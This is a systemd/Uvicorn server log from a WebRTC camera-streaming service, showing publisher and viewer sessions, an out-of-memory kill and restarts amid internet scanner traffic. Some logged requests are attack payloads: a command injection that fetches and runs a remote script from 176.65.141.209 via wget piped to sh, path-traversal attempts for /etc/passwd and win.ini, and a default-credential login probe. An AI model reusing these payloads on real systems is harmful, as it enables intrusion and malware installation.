+Oct 21 00:38:31 ip-172-31-41-158 python3[68299]: INFO:     193.42.96.219:18728 - "GET / HTTP/1.1" 404 Not Found
+Oct 21 00:41:17 ip-172-31-41-158 python3[68299]: INFO:     195.96.129.4:26328 - "GET / HTTP/1.1" 404 Not Found
+Oct 21 01:31:20 ip-172-31-41-158 python3[68299]: INFO:     59.13.196.77:56107 - "GET / HTTP/1.0" 404 Not Found
+Oct 21 01:32:13 ip-172-31-41-158 python3[68299]: WARNING:  Invalid HTTP request received.
+Oct 21 01:32:14 ip-172-31-41-158 python3[68299]: WARNING:  Invalid HTTP request received.
+Oct 21 01:32:14 ip-172-31-41-158 python3[68299]: INFO:     162.243.211.42:43340 - "GET / HTTP/1.1" 404 Not Found
+Oct 21 01:32:15 ip-172-31-41-158 python3[68299]: INFO:     162.243.211.42:43342 - "GET /download/powershell/ HTTP/1.1" 404 Not Found
+Oct 21 01:32:15 ip-172-31-41-158 python3[68299]: INFO:     162.243.211.42:43350 - "GET /get.php HTTP/1.1" 404 Not Found
+Oct 21 01:32:47 ip-172-31-41-158 python3[68299]: INFO:     176.65.149.157:49420 - "GET /login HTTP/1.1" 404 Not Found
+Oct 21 02:04:37 ip-172-31-41-158 python3[68299]: INFO:     162.142.125.118:45886 - "GET / HTTP/1.1" 404 Not Found
+Oct 21 02:04:51 ip-172-31-41-158 python3[68299]: INFO:     162.142.125.118:51788 - "GET / HTTP/1.1" 404 Not Found
+Oct 21 02:04:52 ip-172-31-41-158 python3[68299]: INFO:     162.142.125.118:51804 - "PRI %2A HTTP/2.0" 404 Not Found
+Oct 21 02:04:52 ip-172-31-41-158 python3[68299]: WARNING:  Invalid HTTP request received.
+Oct 21 02:05:06 ip-172-31-41-158 python3[68299]: INFO:     162.142.125.118:39456 - "PRI %2A HTTP/2.0" 404 Not Found
+Oct 21 02:05:06 ip-172-31-41-158 python3[68299]: WARNING:  Invalid HTTP request received.
+Oct 21 02:05:08 ip-172-31-41-158 python3[68299]: INFO:     162.142.125.118:46584 - "GET /.well-known/security.txt HTTP/1.1" 404 Not Found
+Oct 21 02:06:00 ip-172-31-41-158 python3[68299]: INFO:     91.148.240.185:52218 - "GET / HTTP/1.1" 404 Not Found
+Oct 21 02:17:03 ip-172-31-41-158 python3[68299]: INFO:     204.76.203.219:46006 - "GET / HTTP/1.1" 404 Not Found
+Oct 21 03:19:47 ip-172-31-41-158 python3[68299]: INFO:     195.96.129.4:20584 - "GET / HTTP/1.1" 404 Not Found
+Oct 21 03:20:49 ip-172-31-41-158 python3[68299]: INFO:     204.76.203.212:55324 - "GET / HTTP/1.1" 404 Not Found
+Oct 21 03:46:33 ip-172-31-41-158 python3[68299]: INFO:     3.132.23.201:52578 - "GET / HTTP/1.1" 404 Not Found
+Oct 21 03:48:46 ip-172-31-41-158 python3[68299]: INFO:     3.132.23.201:48484 - "GET / HTTP/1.1" 404 Not Found
+Oct 21 03:49:20 ip-172-31-41-158 python3[68299]: WARNING:  Invalid HTTP request received.
+Oct 21 03:51:05 ip-172-31-41-158 python3[68299]: WARNING:  Invalid HTTP request received.
+Oct 21 03:51:51 ip-172-31-41-158 python3[68299]: WARNING:  Invalid HTTP request received.
+Oct 21 04:59:39 ip-172-31-41-158 python3[68299]: INFO:     164.90.237.143:7563 - "GET / HTTP/1.0" 404 Not Found
+Oct 21 04:59:40 ip-172-31-41-158 python3[68299]: INFO:     64.226.79.234:4444 - "GET /solr/admin/info/system HTTP/1.1" 404 Not Found
+Oct 21 04:59:40 ip-172-31-41-158 python3[68299]: INFO:     165.232.64.40:50330 - "GET /query?q=SHOW+DIAGNOSTICS HTTP/1.1" 404 Not Found
+Oct 21 04:59:40 ip-172-31-41-158 python3[68299]: INFO:     164.92.233.38:24926 - "GET / HTTP/1.1" 404 Not Found
+Oct 21 04:59:40 ip-172-31-41-158 python3[68299]: INFO:     142.93.170.248:42338 - "GET /cgi-bin/authLogin.cgi HTTP/1.1" 404 Not Found
+Oct 21 04:59:40 ip-172-31-41-158 python3[68299]: WARNING:  Invalid HTTP request received.
+Oct 21 04:59:40 ip-172-31-41-158 python3[68299]: INFO:     157.230.25.216:14528 - "GET /v2/_catalog HTTP/1.1" 404 Not Found
+Oct 21 04:59:40 ip-172-31-41-158 python3[68299]: WARNING:  Invalid HTTP request received.
+Oct 21 04:59:40 ip-172-31-41-158 python3[68299]: INFO:     64.226.79.234:4452 - "GET /solr/admin/cores?action=STATUS&wt=json HTTP/1.1" 404 Not Found
+Oct 21 04:59:40 ip-172-31-41-158 python3[68299]: INFO:     178.128.214.94:47338 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+Oct 21 04:59:40 ip-172-31-41-158 python3[68299]: WARNING:  Invalid HTTP request received.
+Oct 21 05:16:07 ip-172-31-41-158 python3[68299]: INFO:     66.132.153.131:40186 - "GET / HTTP/1.1" 404 Not Found
+Oct 21 05:16:16 ip-172-31-41-158 python3[68299]: INFO:     66.132.153.131:60606 - "GET / HTTP/1.1" 404 Not Found
+Oct 21 05:16:17 ip-172-31-41-158 python3[68299]: INFO:     66.132.153.131:60622 - "PRI %2A HTTP/2.0" 404 Not Found
+Oct 21 05:16:17 ip-172-31-41-158 python3[68299]: WARNING:  Invalid HTTP request received.
+Oct 21 05:16:22 ip-172-31-41-158 python3[68299]: INFO:     66.132.153.131:60586 - "PRI %2A HTTP/2.0" 404 Not Found
+Oct 21 05:16:22 ip-172-31-41-158 python3[68299]: WARNING:  Invalid HTTP request received.
+Oct 21 05:16:24 ip-172-31-41-158 python3[68299]: INFO:     66.132.153.131:60596 - "GET /sitemap.xml HTTP/1.1" 404 Not Found
+Oct 21 05:35:14 ip-172-31-41-158 python3[68299]: INFO:     20.64.106.19:50284 - "GET / HTTP/1.1" 404 Not Found
+Oct 21 05:45:02 ip-172-31-41-158 python3[68299]: INFO:     198.235.24.150:57346 - "GET / HTTP/1.1" 404 Not Found
+Oct 21 05:54:13 ip-172-31-41-158 python3[68299]: INFO:     204.76.203.219:48676 - "GET / HTTP/1.1" 404 Not Found
+Oct 21 06:00:24 ip-172-31-41-158 python3[68299]: INFO:     195.96.129.4:59646 - "GET / HTTP/1.1" 404 Not Found
+Oct 21 06:28:37 ip-172-31-41-158 python3[68299]: INFO:     204.76.203.212:52108 - "GET / HTTP/1.1" 404 Not Found
+Oct 21 06:32:45 ip-172-31-41-158 python3[68299]: INFO:     199.45.154.129:40088 - "GET / HTTP/1.1" 404 Not Found
+Oct 21 06:32:58 ip-172-31-41-158 python3[68299]: INFO:     199.45.154.129:47238 - "GET / HTTP/1.1" 404 Not Found
+Oct 21 06:32:58 ip-172-31-41-158 python3[68299]: INFO:     199.45.154.129:47244 - "PRI %2A HTTP/2.0" 404 Not Found
+Oct 21 06:32:58 ip-172-31-41-158 python3[68299]: WARNING:  Invalid HTTP request received.
+Oct 21 06:33:03 ip-172-31-41-158 python3[68299]: INFO:     199.45.154.129:33046 - "PRI %2A HTTP/2.0" 404 Not Found
+Oct 21 06:33:03 ip-172-31-41-158 python3[68299]: WARNING:  Invalid HTTP request received.
+Oct 21 06:33:05 ip-172-31-41-158 python3[68299]: INFO:     199.45.154.129:33050 - "GET /sitemap.xml HTTP/1.1" 404 Not Found
+Oct 21 06:35:10 ip-172-31-41-158 python3[68299]: INFO:     198.235.24.158:56792 - "GET / HTTP/1.0" 404 Not Found
+Oct 21 06:59:17 ip-172-31-41-158 python3[68299]: INFO:     165.154.14.113:47164 - "GET / HTTP/1.1" 404 Not Found
+Oct 21 07:22:17 ip-172-31-41-158 python3[68299]: INFO:     167.99.93.212:57096 - "GET /aaa9 HTTP/1.1" 404 Not Found
+Oct 21 07:22:21 ip-172-31-41-158 python3[68299]: INFO:     167.99.93.212:57110 - "GET /aab8 HTTP/1.1" 404 Not Found
+Oct 21 07:22:22 ip-172-31-41-158 python3[68299]: INFO:     3.82.192.40:48326 - "GET / HTTP/1.1" 404 Not Found
+Oct 21 07:22:23 ip-172-31-41-158 python3[68299]: INFO:     167.99.93.212:38988 - "GET / HTTP/1.1" 404 Not Found
+Oct 21 07:49:19 ip-172-31-41-158 python3[68299]: INFO:     204.76.203.219:39500 - "GET / HTTP/1.1" 404 Not Found
+Oct 21 07:59:23 ip-172-31-41-158 python3[68299]: INFO:     45.135.194.44:14809 - "GET / HTTP/1.1" 404 Not Found
+Oct 21 08:21:10 ip-172-31-41-158 python3[68299]: INFO:     176.65.148.11:34488 - "GET / HTTP/1.1" 404 Not Found
+Oct 21 08:24:41 ip-172-31-41-158 python3[68299]: WARNING:  Invalid HTTP request received.
+Oct 21 08:24:41 ip-172-31-41-158 python3[68299]: WARNING:  Invalid HTTP request received.
+Oct 21 08:24:42 ip-172-31-41-158 python3[68299]: INFO:     167.99.44.61:33580 - "GET / HTTP/1.1" 404 Not Found
+Oct 21 08:24:42 ip-172-31-41-158 python3[68299]: INFO:     167.99.44.61:33594 - "GET /download/powershell/ HTTP/1.1" 404 Not Found
+Oct 21 08:24:43 ip-172-31-41-158 python3[68299]: INFO:     167.99.44.61:33608 - "GET /get.php HTTP/1.1" 404 Not Found
+Oct 21 09:25:17 ip-172-31-41-158 python3[68299]: INFO:     94.156.152.38:35408 - "GET / HTTP/1.1" 404 Not Found
+Oct 21 09:49:27 ip-172-31-41-158 python3[68299]: INFO:     204.76.203.219:59882 - "GET / HTTP/1.1" 404 Not Found
+Oct 21 09:49:35 ip-172-31-41-158 python3[68299]: INFO:     204.76.203.212:39008 - "GET / HTTP/1.1" 404 Not Found
+Oct 21 09:59:07 ip-172-31-41-158 systemd[1]: Stopping WebRTC Streaming Server...
+Oct 21 09:59:07 ip-172-31-41-158 python3[68299]: INFO:     Shutting down
+Oct 21 09:59:08 ip-172-31-41-158 python3[68299]: INFO:     Waiting for application shutdown.
+Oct 21 09:59:08 ip-172-31-41-158 python3[68299]: INFO:     Application shutdown complete.
+Oct 21 09:59:08 ip-172-31-41-158 python3[68299]: INFO:     Finished server process [68299]
+Oct 21 09:59:08 ip-172-31-41-158 systemd[1]: webrtc.service: Deactivated successfully.
+Oct 21 09:59:08 ip-172-31-41-158 systemd[1]: Stopped WebRTC Streaming Server.
+Oct 21 09:59:08 ip-172-31-41-158 systemd[1]: webrtc.service: Consumed 2min 10.976s CPU time.
+-- Boot c8c5d5b51d0c4163aa4604463c21d285 --
+Oct 21 10:12:47 ip-172-31-41-158 systemd[1]: Started WebRTC Streaming Server.
+Oct 21 10:12:51 ip-172-31-41-158 python3[406]: INFO:     Started server process [406]
+Oct 21 10:12:51 ip-172-31-41-158 python3[406]: INFO:     Waiting for application startup.
+Oct 21 10:12:51 ip-172-31-41-158 python3[406]: INFO:     Application startup complete.
+Oct 21 10:12:51 ip-172-31-41-158 python3[406]: INFO:     Uvicorn running on http://0.0.0.0:8080 (Press CTRL+C to quit)
+Oct 21 10:21:52 ip-172-31-41-158 python3[406]: INFO:     193.42.96.185:63268 - "GET / HTTP/1.1" 404 Not Found
+Oct 21 10:22:05 ip-172-31-41-158 python3[406]: INFO:     213.109.200.117:23920 - "GET / HTTP/1.1" 404 Not Found
+Oct 21 10:22:12 ip-172-31-41-158 python3[406]: INFO:     193.42.96.155:45250 - "GET / HTTP/1.1" 404 Not Found
+Oct 21 10:22:33 ip-172-31-41-158 python3[406]: INFO:     45.153.34.54:60428 - "GET / HTTP/1.1" 404 Not Found
+Oct 21 10:22:34 ip-172-31-41-158 python3[406]: INFO:     193.42.96.130:42538 - "GET / HTTP/1.1" 404 Not Found
+Oct 21 10:32:41 ip-172-31-41-158 python3[406]: INFO:     176.65.148.11:42416 - "GET / HTTP/1.1" 404 Not Found
+Oct 21 10:43:10 ip-172-31-41-158 python3[406]: INFO:     121.141.19.79:52042 - "GET /health HTTP/1.1" 200 OK
+Oct 21 11:08:48 ip-172-31-41-158 python3[406]: INFO:     45.153.34.54:45566 - "GET / HTTP/1.1" 404 Not Found
+Oct 21 11:13:20 ip-172-31-41-158 python3[406]: INFO:     195.96.129.4:37516 - "GET / HTTP/1.1" 404 Not Found
+Oct 21 11:15:59 ip-172-31-41-158 python3[406]: INFO:     206.168.34.201:42952 - "GET / HTTP/1.1" 404 Not Found
+Oct 21 11:16:11 ip-172-31-41-158 python3[406]: INFO:     206.168.34.201:45834 - "GET / HTTP/1.1" 404 Not Found
+Oct 21 11:16:13 ip-172-31-41-158 python3[406]: INFO:     206.168.34.201:45838 - "PRI %2A HTTP/2.0" 404 Not Found
+Oct 21 11:16:13 ip-172-31-41-158 python3[406]: WARNING:  Invalid HTTP request received.
+Oct 21 11:16:23 ip-172-31-41-158 python3[406]: INFO:     206.168.34.201:40112 - "PRI %2A HTTP/2.0" 404 Not Found
+Oct 21 11:16:23 ip-172-31-41-158 python3[406]: WARNING:  Invalid HTTP request received.
+Oct 21 11:16:24 ip-172-31-41-158 python3[406]: INFO:     206.168.34.201:40128 - "GET /sitemap.xml HTTP/1.1" 404 Not Found
+Oct 21 11:42:03 ip-172-31-41-158 python3[406]: INFO:     176.65.149.157:20872 - "GET /login HTTP/1.1" 404 Not Found
+Oct 21 11:54:18 ip-172-31-41-158 python3[406]: INFO:     204.76.203.219:35726 - "GET / HTTP/1.1" 404 Not Found
+Oct 21 12:07:01 ip-172-31-41-158 python3[406]: INFO:     20.118.32.47:37986 - "GET / HTTP/1.1" 404 Not Found
+Oct 21 12:14:43 ip-172-31-41-158 python3[406]: INFO:     205.210.31.139:56437 - "GET / HTTP/1.0" 404 Not Found
+Oct 21 12:28:27 ip-172-31-41-158 python3[406]: INFO:     27.122.61.227:45938 - "GET /boaform/admin/formLogin?username=ec8&psd=ec8 HTTP/1.0" 404 Not Found
+Oct 21 13:27:07 ip-172-31-41-158 python3[406]: INFO:     192.159.99.180:50558 - "GET / HTTP/1.1" 404 Not Found
+Oct 21 13:27:13 ip-172-31-41-158 python3[406]: WARNING:  Invalid HTTP request received.
+Oct 21 13:27:14 ip-172-31-41-158 python3[406]: INFO:     192.159.99.180:47892 - "POST /device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=wget%20http%3A%2F%2F176.65.141.209%2Fmass%20-O-%20%7C%20sh HTTP/1.1" 404 Not Found
+Oct 21 13:27:15 ip-172-31-41-158 python3[406]: INFO:     192.159.99.180:47902 - "GET / HTTP/1.0" 404 Not Found
+Oct 21 13:31:08 ip-172-31-41-158 python3[406]: WARNING:  Invalid HTTP request received.
+Oct 21 13:31:15 ip-172-31-41-158 python3[406]: INFO:     192.159.99.180:38942 - "POST /device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=wget%20http%3A%2F%2F176.65.141.209%2Fmass%20-O-%20%7C%20sh HTTP/1.1" 404 Not Found
+Oct 21 13:31:16 ip-172-31-41-158 python3[406]: INFO:     192.159.99.180:38956 - "GET / HTTP/1.0" 404 Not Found
+Oct 21 13:34:09 ip-172-31-41-158 python3[406]: INFO:     176.65.149.157:21542 - "GET /login HTTP/1.1" 404 Not Found
+Oct 21 13:42:15 ip-172-31-41-158 python3[406]: INFO:     204.76.203.219:40744 - "GET / HTTP/1.1" 404 Not Found
+Oct 21 14:00:15 ip-172-31-41-158 python3[406]: /publish: Access to cam01
+Oct 21 14:00:15 ip-172-31-41-158 python3[406]: Receive Publisher Track: cam01, kind=video
+Oct 21 14:00:15 ip-172-31-41-158 python3[406]: INFO:     121.141.19.79:62622 - "POST /publish HTTP/1.1" 200 OK
+Oct 21 14:01:27 ip-172-31-41-158 python3[406]: publisher[cam01] state: connecting
+Oct 21 14:01:27 ip-172-31-41-158 python3[406]: publisher[cam01] state: connected
+Oct 21 14:01:27 ip-172-31-41-158 python3[406]: INFO:     121.141.19.79:3503 - "GET /health HTTP/1.1" 200 OK
+Oct 21 14:01:43 ip-172-31-41-158 python3[406]: INFO:     121.141.19.79:3514 - "GET /health HTTP/1.1" 200 OK
+Oct 21 14:01:43 ip-172-31-41-158 python3[406]: INFO:     121.141.19.79:3514 - "GET /health HTTP/1.1" 200 OK
+Oct 21 14:01:44 ip-172-31-41-158 python3[406]: INFO:     121.141.19.79:3514 - "GET /health HTTP/1.1" 200 OK
+Oct 21 14:01:55 ip-172-31-41-158 python3[406]: INFO:     121.141.19.79:3531 - "GET /health HTTP/1.1" 200 OK
+Oct 21 14:01:58 ip-172-31-41-158 python3[406]: INFO:     121.141.19.79:3531 - "GET /health HTTP/1.1" 200 OK
+Oct 21 14:02:04 ip-172-31-41-158 python3[406]: INFO:     121.141.19.79:3541 - "GET /health HTTP/1.1" 200 OK
+Oct 21 14:02:05 ip-172-31-41-158 python3[406]: INFO:     121.141.19.79:3541 - "GET /health HTTP/1.1" 200 OK
+Oct 21 14:02:11 ip-172-31-41-158 python3[406]: INFO:     121.141.19.79:3557 - "GET /health HTTP/1.1" 200 OK
+Oct 21 14:02:16 ip-172-31-41-158 python3[406]: INFO:     121.141.19.79:3557 - "OPTIONS /viewer HTTP/1.1" 200 OK
+Oct 21 14:02:21 ip-172-31-41-158 python3[406]: /viewer: target=cam01
+Oct 21 14:02:21 ip-172-31-41-158 python3[406]: INFO:     121.141.19.79:3565 - "POST /viewer HTTP/1.1" 200 OK
+Oct 21 14:03:21 ip-172-31-41-158 python3[406]: viewer state: connecting
+Oct 21 14:03:21 ip-172-31-41-158 python3[406]: INFO:     121.141.19.79:3607 - "GET /health HTTP/1.1" 200 OK
+Oct 21 14:03:30 ip-172-31-41-158 python3[406]: INFO:     121.141.19.79:3607 - "GET /health HTTP/1.1" 200 OK
+Oct 21 14:03:39 ip-172-31-41-158 python3[406]: INFO:     121.141.19.79:3607 - "GET /health HTTP/1.1" 200 OK
+Oct 21 14:03:51 ip-172-31-41-158 python3[406]: INFO:     121.141.19.79:3616 - "GET /health HTTP/1.1" 200 OK
+Oct 21 14:03:51 ip-172-31-41-158 python3[406]: INFO:     121.141.19.79:3628 - "POST /viewer HTTP/1.1" 409 Conflict
+Oct 21 14:03:58 ip-172-31-41-158 systemd[1]: webrtc.service: A process of this unit has been killed by the OOM killer.
+Oct 21 14:03:58 ip-172-31-41-158 systemd[1]: webrtc.service: Main process exited, code=killed, status=9/KILL
+Oct 21 14:03:58 ip-172-31-41-158 systemd[1]: webrtc.service: Failed with result 'oom-kill'.
+Oct 21 14:03:58 ip-172-31-41-158 systemd[1]: webrtc.service: Consumed 1min 29.305s CPU time.
+Oct 21 14:03:58 ip-172-31-41-158 systemd[1]: webrtc.service: Scheduled restart job, restart counter is at 1.
+Oct 21 14:03:58 ip-172-31-41-158 systemd[1]: Stopped WebRTC Streaming Server.
+Oct 21 14:03:58 ip-172-31-41-158 systemd[1]: webrtc.service: Consumed 1min 29.305s CPU time.
+Oct 21 14:03:58 ip-172-31-41-158 systemd[1]: Started WebRTC Streaming Server.
+Oct 21 14:04:00 ip-172-31-41-158 python3[1640]: INFO:     Started server process [1640]
+Oct 21 14:04:00 ip-172-31-41-158 python3[1640]: INFO:     Waiting for application startup.
+Oct 21 14:04:00 ip-172-31-41-158 python3[1640]: INFO:     Application startup complete.
+Oct 21 14:04:00 ip-172-31-41-158 python3[1640]: INFO:     Uvicorn running on http://0.0.0.0:8080 (Press CTRL+C to quit)
+Oct 21 14:04:05 ip-172-31-41-158 python3[1640]: INFO:     121.141.19.79:3659 - "GET /health HTTP/1.1" 200 OK
+Oct 21 14:04:07 ip-172-31-41-158 python3[1640]: INFO:     121.141.19.79:3659 - "GET /health HTTP/1.1" 200 OK
+Oct 21 14:04:20 ip-172-31-41-158 python3[1640]: /publish: Access to cam01
+Oct 21 14:04:20 ip-172-31-41-158 python3[1640]: Receive Publisher Track: cam01, kind=video
+Oct 21 14:04:20 ip-172-31-41-158 python3[1640]: INFO:     121.141.19.79:62648 - "POST /publish HTTP/1.1" 200 OK
+Oct 21 14:04:29 ip-172-31-41-158 python3[1640]: publisher[cam01] state: connecting
+Oct 21 14:04:29 ip-172-31-41-158 python3[1640]: publisher[cam01] state: connected
+Oct 21 14:04:29 ip-172-31-41-158 python3[1640]: /viewer: target=cam01
+Oct 21 14:04:29 ip-172-31-41-158 python3[1640]: INFO:     121.141.19.79:3680 - "POST /viewer HTTP/1.1" 200 OK
+Oct 21 14:05:05 ip-172-31-41-158 python3[1640]: viewer state: connecting
+Oct 21 14:05:05 ip-172-31-41-158 python3[1640]: viewer state: connected
+Oct 21 14:05:05 ip-172-31-41-158 python3[1640]: viewer state: closed
+Oct 21 14:05:05 ip-172-31-41-158 python3[1640]: /viewer: target=cam01
+Oct 21 14:05:05 ip-172-31-41-158 python3[1640]: INFO:     121.141.19.79:3706 - "POST /viewer HTTP/1.1" 200 OK
+Oct 21 14:06:32 ip-172-31-41-158 python3[1640]: viewer state: connecting
+Oct 21 14:06:32 ip-172-31-41-158 python3[1640]: viewer state: connected
+Oct 21 14:06:32 ip-172-31-41-158 python3[1640]: viewer state: closed
+Oct 21 14:06:32 ip-172-31-41-158 python3[1640]: /viewer: target=cam01
+Oct 21 14:06:32 ip-172-31-41-158 python3[1640]: INFO:     121.141.19.79:3768 - "POST /viewer HTTP/1.1" 200 OK
+Oct 21 14:07:08 ip-172-31-41-158 python3[1640]: viewer state: connecting
+Oct 21 14:07:08 ip-172-31-41-158 python3[1640]: viewer state: connected
+Oct 21 14:07:08 ip-172-31-41-158 python3[1640]: End Publisher Video: cam01
+Oct 21 14:07:08 ip-172-31-41-158 python3[1640]: publisher[cam01] state: closed
+Oct 21 14:07:08 ip-172-31-41-158 python3[1640]: Closing viewer connection for cam01...
+Oct 21 14:07:08 ip-172-31-41-158 python3[1640]: viewer state: closed
+Oct 21 14:07:08 ip-172-31-41-158 python3[1640]: /publish: Access to cam01
+Oct 21 14:07:08 ip-172-31-41-158 python3[1640]: Receive Publisher Track: cam01, kind=video
+Oct 21 14:07:08 ip-172-31-41-158 python3[1640]: INFO:     121.141.19.79:62668 - "POST /publish HTTP/1.1" 200 OK
+Oct 21 14:07:21 ip-172-31-41-158 python3[1640]: publisher[cam01] state: connecting
+Oct 21 14:07:21 ip-172-31-41-158 python3[1640]: publisher[cam01] state: connected
+Oct 21 14:07:21 ip-172-31-41-158 python3[1640]: /viewer: target=cam01
+Oct 21 14:07:21 ip-172-31-41-158 python3[1640]: INFO:     121.141.19.79:3800 - "POST /viewer HTTP/1.1" 200 OK
+Oct 21 14:07:33 ip-172-31-41-158 python3[1640]: viewer state: connecting
+Oct 21 14:07:33 ip-172-31-41-158 python3[1640]: viewer state: connected
+Oct 21 14:07:33 ip-172-31-41-158 python3[1640]: viewer state: closed
+Oct 21 14:07:33 ip-172-31-41-158 python3[1640]: /viewer: target=cam01
+Oct 21 14:07:33 ip-172-31-41-158 python3[1640]: INFO:     121.141.19.79:3808 - "POST /viewer HTTP/1.1" 200 OK
+Oct 21 14:09:36 ip-172-31-41-158 python3[1640]: viewer state: connecting
+Oct 21 14:09:36 ip-172-31-41-158 python3[1640]: viewer state: connected
+Oct 21 14:09:36 ip-172-31-41-158 python3[1640]: End Publisher Video: cam01
+Oct 21 14:09:36 ip-172-31-41-158 python3[1640]: publisher[cam01] state: closed
+Oct 21 14:09:36 ip-172-31-41-158 python3[1640]: Closing viewer connection for cam01...
+Oct 21 14:09:36 ip-172-31-41-158 python3[1640]: viewer state: closed
+Oct 21 14:09:36 ip-172-31-41-158 python3[1640]: /publish: Access to cam01
+Oct 21 14:09:36 ip-172-31-41-158 python3[1640]: Receive Publisher Track: cam01, kind=video
+Oct 21 14:09:36 ip-172-31-41-158 python3[1640]: INFO:     121.141.19.79:62681 - "POST /publish HTTP/1.1" 200 OK
+Oct 21 14:10:55 ip-172-31-41-158 python3[1640]: publisher[cam01] state: connecting
+Oct 21 14:10:55 ip-172-31-41-158 python3[1640]: publisher[cam01] state: connected
+Oct 21 14:10:55 ip-172-31-41-158 python3[1640]: INFO:     121.141.19.79:57401 - "OPTIONS /viewer HTTP/1.1" 200 OK
+Oct 21 14:11:00 ip-172-31-41-158 python3[1640]: /viewer: target=cam01
+Oct 21 14:11:00 ip-172-31-41-158 python3[1640]: INFO:     121.141.19.79:57401 - "POST /viewer HTTP/1.1" 200 OK
+Oct 21 14:11:15 ip-172-31-41-158 python3[1640]: viewer state: connecting
+Oct 21 14:11:15 ip-172-31-41-158 python3[1640]: viewer state: connected
+Oct 21 14:11:15 ip-172-31-41-158 python3[1640]: viewer state: closed
+Oct 21 14:11:15 ip-172-31-41-158 python3[1640]: /viewer: target=cam01
+Oct 21 14:11:15 ip-172-31-41-158 python3[1640]: INFO:     121.141.19.79:57464 - "POST /viewer HTTP/1.1" 200 OK
+Oct 21 14:12:28 ip-172-31-41-158 python3[1640]: viewer state: connecting
+Oct 21 14:12:28 ip-172-31-41-158 python3[1640]: viewer state: connected
+Oct 21 14:12:28 ip-172-31-41-158 python3[1640]: End Publisher Video: cam01
+Oct 21 14:12:28 ip-172-31-41-158 python3[1640]: publisher[cam01] state: closed
+Oct 21 14:12:28 ip-172-31-41-158 python3[1640]: Closing viewer connection for cam01...
+Oct 21 14:12:28 ip-172-31-41-158 python3[1640]: viewer state: closed
+Oct 21 14:12:28 ip-172-31-41-158 python3[1640]: /publish: Access to cam01
+Oct 21 14:12:28 ip-172-31-41-158 python3[1640]: Receive Publisher Track: cam01, kind=video
+Oct 21 14:12:28 ip-172-31-41-158 python3[1640]: INFO:     121.141.19.79:62700 - "POST /publish HTTP/1.1" 200 OK
+Oct 21 14:12:37 ip-172-31-41-158 python3[1640]: publisher[cam01] state: connecting
+Oct 21 14:12:37 ip-172-31-41-158 python3[1640]: publisher[cam01] state: connected
+Oct 21 14:12:37 ip-172-31-41-158 python3[1640]: /viewer: target=cam01
+Oct 21 14:12:37 ip-172-31-41-158 python3[1640]: INFO:     121.141.19.79:6655 - "POST /viewer HTTP/1.1" 200 OK
+Oct 21 14:12:54 ip-172-31-41-158 python3[1640]: viewer state: connecting
+Oct 21 14:12:54 ip-172-31-41-158 python3[1640]: viewer state: connected
+Oct 21 14:12:54 ip-172-31-41-158 python3[1640]: viewer state: closed
+Oct 21 14:12:54 ip-172-31-41-158 python3[1640]: /viewer: target=cam01
+Oct 21 14:12:54 ip-172-31-41-158 python3[1640]: INFO:     121.141.19.79:57911 - "POST /viewer HTTP/1.1" 200 OK
+Oct 21 14:40:56 ip-172-31-41-158 python3[1640]: viewer state: connecting
+Oct 21 14:40:56 ip-172-31-41-158 python3[1640]: viewer state: connected
+Oct 21 14:40:56 ip-172-31-41-158 python3[1640]: publisher[cam01] state: closed
+Oct 21 14:40:56 ip-172-31-41-158 python3[1640]: Closing viewer connection for cam01...
+Oct 21 14:40:56 ip-172-31-41-158 python3[1640]: End Publisher Video: cam01
+Oct 21 14:40:56 ip-172-31-41-158 python3[1640]: viewer state: closed
+Oct 21 14:40:56 ip-172-31-41-158 python3[1640]: INFO:     204.76.203.18:37284 - "GET / HTTP/1.1" 404 Not Found
+Oct 21 14:49:15 ip-172-31-41-158 python3[1640]: INFO:     204.76.203.18:49996 - "GET /bins/ HTTP/1.1" 404 Not Found
+Oct 21 15:07:03 ip-172-31-41-158 python3[1640]: INFO:     204.76.203.18:45852 - "GET /bin/ HTTP/1.1" 404 Not Found
+Oct 21 15:09:14 ip-172-31-41-158 python3[1640]: INFO:     5.187.35.54:42344 - "GET /../../../../../../etc/passwd HTTP/1.1" 404 Not Found
+Oct 21 15:09:14 ip-172-31-41-158 python3[1640]: INFO:     5.187.35.54:42328 - "GET //%5C../%5C../%5C../%5C../%5C../%5C../windows/win.ini HTTP/1.1" 404 Not Found
+Oct 21 15:09:43 ip-172-31-41-158 python3[1640]: INFO:     204.76.203.18:43970 - "GET /backup/ HTTP/1.1" 404 Not Found
+Oct 21 15:14:09 ip-172-31-41-158 python3[1640]: INFO:     5.187.35.54:58628 - "GET /../../../../../../etc/passwd HTTP/1.1" 404 Not Found
+Oct 21 15:14:09 ip-172-31-41-158 python3[1640]: INFO:     5.187.35.54:58614 - "GET //%5C../%5C../%5C../%5C../%5C../%5C../windows/win.ini HTTP/1.1" 404 Not Found
+Oct 21 15:24:00 ip-172-31-41-158 python3[1640]: WARNING:  Invalid HTTP request received.
+Oct 21 15:24:00 ip-172-31-41-158 python3[1640]: WARNING:  Invalid HTTP request received.
+Oct 21 15:24:01 ip-172-31-41-158 python3[1640]: INFO:     149.40.49.208:42949 - "CONNECT www.google.com%3A443 HTTP/1.1" 404 Not Found
+Oct 21 15:24:01 ip-172-31-41-158 python3[1640]: WARNING:  Invalid HTTP request received.
+Oct 21 15:27:57 ip-172-31-41-158 python3[1640]: WARNING:  Invalid HTTP request received.
+Oct 21 15:34:17 ip-172-31-41-158 systemd[1]: Stopping WebRTC Streaming Server...
+Oct 21 15:34:17 ip-172-31-41-158 python3[1640]: INFO:     Shutting down
+Oct 21 15:34:17 ip-172-31-41-158 python3[1640]: INFO:     Waiting for application shutdown.
+Oct 21 15:34:17 ip-172-31-41-158 python3[1640]: INFO:     Application shutdown complete.
+Oct 21 15:34:17 ip-172-31-41-158 python3[1640]: INFO:     Finished server process [1640]
+Oct 21 15:34:17 ip-172-31-41-158 systemd[1]: webrtc.service: Deactivated successfully.
+Oct 21 15:34:17 ip-172-31-41-158 systemd[1]: Stopped WebRTC Streaming Server.
+Oct 21 15:34:17 ip-172-31-41-158 systemd[1]: webrtc.service: Consumed 2min 52.357s CPU time.
+Oct 21 15:34:17 ip-172-31-41-158 systemd[1]: Started WebRTC Streaming Server.
+Oct 21 15:34:18 ip-172-31-41-158 python3[1831]: INFO:     Started server process [1831]
+Oct 21 15:34:18 ip-172-31-41-158 python3[1831]: INFO:     Waiting for application startup.
+Oct 21 15:34:18 ip-172-31-41-158 python3[1831]: INFO:     Application startup complete.
